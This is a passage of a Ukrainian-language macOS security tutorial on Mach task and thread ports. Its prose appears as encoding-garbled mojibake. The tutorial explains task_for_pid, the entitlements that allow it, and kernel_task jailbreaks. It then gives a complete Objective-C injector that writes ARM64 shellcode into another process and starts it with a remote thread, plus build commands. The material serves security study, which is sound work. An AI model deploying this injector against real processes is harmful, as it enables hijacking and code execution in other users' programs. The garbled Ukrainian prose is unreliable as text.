* **TASK\_WIRED\_LEDGER\_PORT**\[–ø—Ä–∞–≤–æ –Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫—É ledger\]: –ü–æ—Ä—Ç, —è–∫–∏–π –Ω–∞–∑–∏–≤–∞—î –¥–∂–µ—Ä–µ–ª–æ, –∑ —è–∫–æ–≥–æ —Ü–µ –∑–∞–≤–¥–∞–Ω–Ω—è –≤–∏—Ç—è–≥—É—î —Å–≤–æ—é –∫–µ—Ä–æ–≤–∞–Ω—É —è–¥—Ä–æ–º –ø–∞–º'—è—Ç—å.
* **TASK\_PAGED\_LEDGER\_PORT**\[–ø—Ä–∞–≤–æ –Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫—É ledger\]: –ü–æ—Ä—Ç, —è–∫–∏–π –Ω–∞–∑–∏–≤–∞—î –¥–∂–µ—Ä–µ–ª–æ, –∑ —è–∫–æ–≥–æ —Ü–µ –∑–∞–≤–¥–∞–Ω–Ω—è –≤–∏—Ç—è–≥—É—î —Å–≤–æ—é –ø–∞–º'—è—Ç—å, –∫–µ—Ä–æ–≤–∞–Ω—É –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º.

### –ü–æ—Ä—Ç–∏ –∑–∞–≤–¥–∞–Ω—å

–°–ø–æ—á–∞—Ç–∫—É —É Mach –Ω–µ –±—É–ª–æ "–ø—Ä–æ—Ü–µ—Å—ñ–≤", –±—É–ª–∏ "–∑–∞–≤–¥–∞–Ω–Ω—è", —è–∫—ñ –≤–≤–∞–∂–∞–ª–∏—Å—è –±—ñ–ª—å—à —è–∫ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∏ –¥–ª—è –ø–æ—Ç–æ–∫—ñ–≤. –ö–æ–ª–∏ Mach –±—É–≤ –æ–±'—î–¥–Ω–∞–Ω–∏–π –∑ BSD, **–∫–æ–∂–Ω–µ –∑–∞–≤–¥–∞–Ω–Ω—è –±—É–ª–æ –∫–æ—Ä–µ–ª—é–≤–∞–Ω–æ –∑ –ø—Ä–æ—Ü–µ—Å–æ–º BSD**. –¢–æ–º—É –∫–æ–∂–µ–Ω –ø—Ä–æ—Ü–µ—Å BSD –º–∞—î –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –¥–µ—Ç–∞–ª—ñ –¥–ª—è —Ç–æ–≥–æ, —â–æ–± –±—É—Ç–∏ –ø—Ä–æ—Ü–µ—Å–æ–º, —ñ –∫–æ–∂–Ω–µ –∑–∞–≤–¥–∞–Ω–Ω—è Mach —Ç–∞–∫–æ–∂ –º–∞—î —Å–≤–æ—é –≤–Ω—É—Ç—Ä—ñ—à–Ω—é —Å—Ç—Ä—É–∫—Ç—É—Ä—É (–∫—Ä—ñ–º –Ω–µ—ñ—Å–Ω—É—é—á–æ–≥–æ pid 0, —è–∫–∏–π —î `kernel_task`).

–Ñ –¥–≤—ñ –¥—É–∂–µ —Ü—ñ–∫–∞–≤—ñ —Ñ—É–Ω–∫—Ü—ñ—ó, –ø–æ–≤'—è–∑–∞–Ω—ñ –∑ —Ü–∏–º:

* `task_for_pid(target_task_port, pid, &task_port_of_pid)`: –û—Ç—Ä–∏–º–∞—Ç–∏ –ø—Ä–∞–≤–æ –Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫—É –¥–ª—è –ø–æ—Ä—Ç—É –∑–∞–≤–¥–∞–Ω–Ω—è –∑–∞–≤–¥–∞–Ω–Ω—è, –ø–æ–≤'—è–∑–∞–Ω–æ–≥–æ —ñ–∑ –≤–∫–∞–∑–∞–Ω–∏–º `pid`, —ñ –ø–µ—Ä–µ–¥–∞—Ç–∏ –π–æ–≥–æ –≤–∫–∞–∑–∞–Ω–æ–º—É `target_task_port` (—è–∫–∏–π –∑–∞–∑–≤–∏—á–∞–π —î –≤–∏–∫–ª–∏–∫–∞—é—á–∏–º –∑–∞–≤–¥–∞–Ω–Ω—è–º, —è–∫–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–ª–æ `mach_task_self()`, –∞–ª–µ –º–æ–∂–µ –±—É—Ç–∏ –ø–æ—Ä—Ç–æ–º –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ —á–µ—Ä–µ–∑ —ñ–Ω—à–µ –∑–∞–≤–¥–∞–Ω–Ω—è).
* `pid_for_task(task, &pid)`: –ó–∞–¥–∞–Ω–∏–π –ø—Ä–∞–≤–æ –Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫—É –¥–æ –∑–∞–≤–¥–∞–Ω–Ω—è, –∑–Ω–∞–π—Ç–∏, –¥–æ —è–∫–æ–≥–æ PID —Ü–µ –∑–∞–≤–¥–∞–Ω–Ω—è –≤—ñ–¥–Ω–æ—Å–∏—Ç—å—Å—è.

–î–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥—ñ–π —É –º–µ–∂–∞—Ö –∑–∞–≤–¥–∞–Ω–Ω—è, –∑–∞–≤–¥–∞–Ω–Ω—é –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø—Ä–∞–≤–æ –Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫—É –¥–æ —Å–µ–±–µ, –≤–∏–∫–ª–∏–∫–∞—é—á–∏ `mach_task_self()` (—è–∫–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î `task_self_trap` (28)). –ó —Ü–∏–º –¥–æ–∑–≤–æ–ª–æ–º –∑–∞–≤–¥–∞–Ω–Ω—è –º–æ–∂–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫—ñ–ª—å–∫–∞ –¥—ñ–π, —Ç–∞–∫–∏—Ö —è–∫:

* `task_threads`: –û—Ç—Ä–∏–º–∞—Ç–∏ –ø—Ä–∞–≤–æ –Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫—É –Ω–∞–¥ —É—Å—ñ–º–∞ –ø–æ—Ä—Ç–∞–º–∏ –∑–∞–≤–¥–∞–Ω—å –ø–æ—Ç–æ–∫—ñ–≤ –∑–∞–≤–¥–∞–Ω–Ω—è
* `task_info`: –û—Ç—Ä–∏–º–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∑–∞–≤–¥–∞–Ω–Ω—è
* `task_suspend/resume`: –ü—Ä–∏–∑—É–ø–∏–Ω–∏—Ç–∏ –∞–±–æ –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏ –∑–∞–≤–¥–∞–Ω–Ω—è
* `task_[get/set]_special_port`
* `thread_create`: –°—Ç–≤–æ—Ä–∏—Ç–∏ –ø–æ—Ç—ñ–∫
* `task_[get/set]_state`: –ö–µ—Ä—É–≤–∞—Ç–∏ —Å—Ç–∞–Ω–æ–º –∑–∞–≤–¥–∞–Ω–Ω—è
* —ñ –±—ñ–ª—å—à–µ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤ [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

{% hint style="danger" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –∑ –ø—Ä–∞–≤–æ–º –Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫—É –ø–æ—Ä—Ç—É –∑–∞–≤–¥–∞–Ω–Ω—è **—ñ–Ω—à–æ–≥–æ –∑–∞–≤–¥–∞–Ω–Ω—è** –º–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ —Ç–∞–∫—ñ –¥—ñ—ó –Ω–∞–¥ —ñ–Ω—à–∏–º –∑–∞–≤–¥–∞–Ω–Ω—è–º.
{% endhint %}

–ö—Ä—ñ–º —Ç–æ–≥–æ, –ø–æ—Ä—Ç –∑–∞–≤–¥–∞–Ω–Ω—è —Ç–∞–∫–æ–∂ —î **–ø–æ—Ä—Ç–æ–º `vm_map`**, —è–∫–∏–π –¥–æ–∑–≤–æ–ª—è—î **—á–∏—Ç–∞—Ç–∏ —Ç–∞ –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –ø–∞–º'—è—Ç—å** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∑–∞–≤–¥–∞–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ñ—É–Ω–∫—Ü—ñ–π, —Ç–∞–∫–∏—Ö —è–∫ `vm_read()` —Ç–∞ `vm_write()`. –¶–µ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –æ–∑–Ω–∞—á–∞—î, —â–æ –∑–∞–≤–¥–∞–Ω–Ω—è –∑ –ø—Ä–∞–≤–∞–º–∏ –Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫—É –ø–æ—Ä—Ç—É –∑–∞–≤–¥–∞–Ω–Ω—è —ñ–Ω—à–æ–≥–æ –∑–∞–≤–¥–∞–Ω–Ω—è –∑–º–æ–∂–µ **–≤–ø—Ä–æ–≤–∞–¥–∏—Ç–∏ –∫–æ–¥ —É —Ü–µ –∑–∞–≤–¥–∞–Ω–Ω—è**.

–ü–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ –æ—Å–∫—ñ–ª—å–∫–∏ **—è–¥—Ä–æ —Ç–∞–∫–æ–∂ —î –∑–∞–≤–¥–∞–Ω–Ω—è–º**, —è–∫—â–æ —Ö—Ç–æ—Å—å –∑–º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ **–ø—Ä–∞–≤–∞ –Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫—É** –Ω–∞–¥ **`kernel_task`**, –≤—ñ–Ω –∑–º–æ–∂–µ –∑–º—É—Å–∏—Ç–∏ —è–¥—Ä–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ –±—É–¥—å-—â–æ (–≤—Ç–µ—á—ñ –∑ –≤'—è–∑–Ω–∏—Ü—ñ).

* –í–∏–∫–ª–∏–∫–∞–π—Ç–µ `mach_task_self()` –¥–ª—è **–æ—Ç—Ä–∏–º–∞–Ω–Ω—è —ñ–º–µ–Ω—ñ** –¥–ª—è —Ü—å–æ–≥–æ –ø–æ—Ä—Ç—É –¥–ª—è –≤–∏–∫–ª–∏–∫–∞—é—á–æ–≥–æ –∑–∞–≤–¥–∞–Ω–Ω—è. –¶–µ–π –ø–æ—Ä—Ç **—Å–ø–∞–¥–∫–æ–≤—É—î—Ç—å—Å—è** –ª–∏—à–µ –ø—ñ–¥ —á–∞—Å **`exec()`**; –Ω–æ–≤–µ –∑–∞–≤–¥–∞–Ω–Ω—è, —Å—Ç–≤–æ—Ä–µ–Ω–µ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `fork()`, –æ—Ç—Ä–∏–º—É—î –Ω–æ–≤–∏–π –ø–æ—Ä—Ç –∑–∞–≤–¥–∞–Ω–Ω—è (—è–∫ –æ—Å–æ–±–ª–∏–≤–∏–π –≤–∏–ø–∞–¥–æ–∫, –∑–∞–≤–¥–∞–Ω–Ω—è —Ç–∞–∫–æ–∂ –æ—Ç—Ä–∏–º—É—î –Ω–æ–≤–∏–π –ø–æ—Ä—Ç –∑–∞–≤–¥–∞–Ω–Ω—è –ø—ñ—Å–ª—è `exec()` —É suid-–±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª–∞—Ö). –Ñ–¥–∏–Ω–∏–π —Å–ø–æ—Å—ñ–± —Å—Ç–≤–æ—Ä–∏—Ç–∏ –∑–∞–≤–¥–∞–Ω–Ω—è —Ç–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ –π–æ–≥–æ –ø–æ—Ä—Ç - –≤–∏–∫–æ–Ω–∞—Ç–∏ ["—Ç–∞–Ω–µ—Ü—å –æ–±–º—ñ–Ω—É –ø–æ—Ä—Ç–∞–º–∏"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è `fork()`.
* –¶–µ –æ–±–º–µ–∂–µ–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É –¥–æ –ø–æ—Ä—Ç—É (–∑ `macos_task_policy` –∑ –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É `AppleMobileFileIntegrity`):
* –Ø–∫—â–æ –¥–æ–¥–∞—Ç–æ–∫ –º–∞—î **–¥–æ–∑–≤—ñ–ª com.apple.security.get-task-allow**, –ø—Ä–æ—Ü–µ—Å–∏ –≤—ñ–¥ **—Ç–æ–≥–æ –∂ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –º–æ–∂—É—Ç—å –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –ø–æ—Ä—Ç—É –∑–∞–≤–¥–∞–Ω–Ω—è** (–∑–∞–∑–≤–∏—á–∞–π –¥–æ–¥–∞–Ω–æ Xcode –¥–ª—è –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è). –ü—Ä–æ—Ü–µ—Å –Ω–æ—Ç–∞—Ä–∏–∑–∞—Ü—ñ—ó –Ω–µ –¥–æ–∑–≤–æ–ª–∏—Ç—å —Ü–µ –¥–ª—è –≤–∏—Ä–æ–±–Ω–∏—á–∏—Ö –≤–µ—Ä—Å—ñ–π.
* –î–æ–¥–∞—Ç–∫–∏ –∑ –¥–æ–∑–≤–æ–ª–æ–º **`com.apple.system-task-ports`** –º–æ–∂—É—Ç—å –æ—Ç—Ä–∏–º–∞—Ç–∏ **–ø–æ—Ä—Ç –∑–∞–≤–¥–∞–Ω–Ω—è –¥–ª—è –±—É–¥—å-—è–∫–æ–≥–æ** –ø—Ä–æ—Ü–µ—Å—É, –∫—Ä—ñ–º —è–¥—Ä–∞. –£ —Å—Ç–∞—Ä–∏—Ö –≤–µ—Ä—Å—ñ—è—Ö —Ü–µ –Ω–∞–∑–∏–≤–∞–ª–æ—Å—è **`task_for_pid-allow`**. –¶–µ –Ω–∞–¥–∞—î—Ç—å—Å—è –ª–∏—à–µ –¥–æ–¥–∞—Ç–∫–∞–º Apple.
* **Root –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –ø–æ—Ä—Ç—ñ–≤ –∑–∞–≤–¥–∞–Ω—å** –¥–æ–¥–∞—Ç–∫—ñ–≤, **–Ω–µ** —Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–∏—Ö –∑ **–∑–∞—Ö–∏—â–µ–Ω–∏–º** —Ä–µ–∂–∏–º–æ–º –≤–∏–∫–æ–Ω–∞–Ω–Ω—è (—ñ –Ω–µ –≤—ñ–¥ Apple).

**–ü–æ—Ä—Ç —ñ–º–µ–Ω—ñ –∑–∞–≤–¥–∞–Ω–Ω—è:** –ù–µ–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∞ –≤–µ—Ä—Å—ñ—è _–ø–æ—Ä—Ç—É –∑–∞–≤–¥–∞–Ω–Ω—è_. –í—ñ–Ω –ø–æ—Å–∏–ª–∞—î—Ç—å—Å—è –Ω–∞ –∑–∞–≤–¥–∞–Ω–Ω—è, –∞–ª–µ –Ω–µ –¥–æ–∑–≤–æ–ª—è—î –π–æ–≥–æ –∫–µ—Ä—É–≤–∞—Ç–∏. –Ñ–¥–∏–Ω–µ, —â–æ, –∑–¥–∞—î—Ç—å—Å—è, –¥–æ—Å—Ç—É–ø–Ω–µ —á–µ—Ä–µ–∑ –Ω—å–æ–≥–æ, —Ü–µ `task_info()`.

### –ü–æ—Ä—Ç–∏ –ø–æ—Ç–æ–∫—ñ–≤

–£ –ø–æ—Ç–æ–∫—ñ–≤ —Ç–∞–∫–æ–∂ —î –ø–æ–≤'—è–∑–∞–Ω—ñ –ø–æ—Ä—Ç–∏, —è–∫—ñ –≤–∏–¥–Ω–æ –∑ –∑–∞–≤–¥–∞–Ω–Ω—è, —â–æ –≤–∏–∫–ª–∏–∫–∞—î **`task_threads`**, —Ç–∞ –≤—ñ–¥ –ø—Ä–æ—Ü–µ—Å–æ—Ä–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `processor_set_threads`. –ü—Ä–∞–≤–æ –Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫—É –¥–æ –ø–æ—Ä—Ç—É –ø–æ—Ç–æ–∫—É –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—ó –ø—ñ–¥—Å–∏—Å—Ç–µ–º–∏ `thread_act`, —Ç–∞–∫—ñ —è–∫:

* `thread_terminate`
* `thread_[get/set]_state`
* `act_[get/set]_state`
* `thread_[suspend/resume]`
* `thread_info`
* ...

–ë—É–¥—å-—è–∫–∏–π –ø–æ—Ç—ñ–∫ –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ü–µ–π –ø–æ—Ä—Ç, –≤–∏–∫–ª–∏–∫–∞–≤—à–∏ **`mach_thread_sef`**.

### –í–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è —à–µ–ª–ª-–∫–æ–¥—É –≤ –ø–æ—Ç—ñ–∫ —á–µ—Ä–µ–∑ –ø–æ—Ä—Ç –∑–∞–≤–¥–∞–Ω–Ω—è

–í–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ —à–µ–ª–ª-–∫–æ–¥ –∑:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %} {% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**–°–∫–æ–º–ø—ñ–ª—é–π—Ç–µ** –ø–æ–ø–µ—Ä–µ–¥–Ω—é –ø—Ä–æ–≥—Ä–∞–º—É —Ç–∞ –¥–æ–¥–∞–π—Ç–µ **–ø—Ä–∏–≤—ñ–ª–µ—ó**, —â–æ–± –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–ø—Ä–æ–≤–∞–¥–∂—É–≤–∞—Ç–∏ –∫–æ–¥ –∑ —Ç–∏–º —Å–∞–º–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º (—è–∫—â–æ –Ω—ñ, –≤–∞–º –¥–æ–≤–µ–¥–µ—Ç—å—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
{% hint style="success" %}
–î–ª—è —Ç–æ–≥–æ, —â–æ–± —Ü–µ –ø—Ä–∞—Ü—é–≤–∞–ª–æ –Ω–∞ iOS, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –º–∞—Ç–∏ entitlement `dynamic-codesigning`, —â–æ–± –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å —Ä–æ–±–∏—Ç–∏ –∑–∞–ø–∏—Å –ø–∞–º'—è—Ç—ñ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–æ—é.
{% endhint %}

### –í–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è Dylib —É –ø–æ—Ç—ñ–∫ —á–µ—Ä–µ–∑ –ø–æ—Ä—Ç –∑–∞–≤–¥–∞–Ω–Ω—è

–£ macOS **–ø–æ—Ç–æ–∫–∏** –º–æ–∂—É—Ç—å –±—É—Ç–∏ –º–∞–Ω—ñ–ø—É–ª—å–æ–≤–∞–Ω—ñ —á–µ—Ä–µ–∑ **Mach** –∞–±–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **posix `pthread` api**. –ü–æ—Ç—ñ–∫, —è–∫–∏–π –º–∏ —Å—Ç–≤–æ—Ä–∏–ª–∏ —É –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—ñ, –±—É–≤ —Å—Ç–≤–æ—Ä–µ–Ω–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Mach api, —Ç–æ–º—É **–≤—ñ–Ω –Ω–µ —î —Å—É–º—ñ—Å–Ω–∏–º –∑ posix**.

–ë—É–ª–æ –º–æ–∂–ª–∏–≤–æ **–≤–ø—Ä–æ–≤–∞–¥–∏—Ç–∏ –ø—Ä–æ—Å—Ç–∏–π —à–µ–ª–ª-–∫–æ–¥**, —â–æ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–º–∞–Ω–¥—É, –æ—Å–∫—ñ–ª—å–∫–∏ **–Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–ª–æ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –∑ posix** —Å—É–º—ñ—Å–Ω–∏–º–∏ api, —Ç—ñ–ª—å–∫–∏ –∑ Mach. **–ë—ñ–ª—å—à —Å–∫–ª–∞–¥–Ω—ñ –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è** –ø–æ—Ç—Ä–µ–±—É—é—Ç—å, —â–æ–± **–ø–æ—Ç—ñ–∫** —Ç–∞–∫–æ–∂ –±—É–≤ **—Å—É–º—ñ—Å–Ω–∏–º –∑ posix**.

–û—Ç–∂–µ, –¥–ª—è **–ø–æ–∫—Ä–∞—â–µ–Ω–Ω—è –ø–æ—Ç–æ–∫—É** –π–æ–≥–æ —Å–ª—ñ–¥ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ **`pthread_create_from_mach_thread`**, —è–∫–∏–π —Å—Ç–≤–æ—Ä–∏—Ç—å **–¥—ñ–π—Å–Ω–∏–π pthread**. –ü–æ—Ç—ñ–º —Ü–µ–π –Ω–æ–≤–∏–π pthread –º–æ–∂–µ **–≤–∏–∫–ª–∏–∫–∞—Ç–∏ dlopen**, —â–æ–± **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ dylib** –∑ —Å–∏—Å—Ç–µ–º–∏, —Ç–æ–º—É –∑–∞–º—ñ—Å—Ç—å –Ω–∞–ø–∏—Å–∞–Ω–Ω—è –Ω–æ–≤–æ–≥–æ —à–µ–ª–ª-–∫–æ–¥—É –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ä—ñ–∑–Ω–∏—Ö –¥—ñ–π –º–æ–∂–Ω–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –≤–ª–∞—Å–Ω—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏.

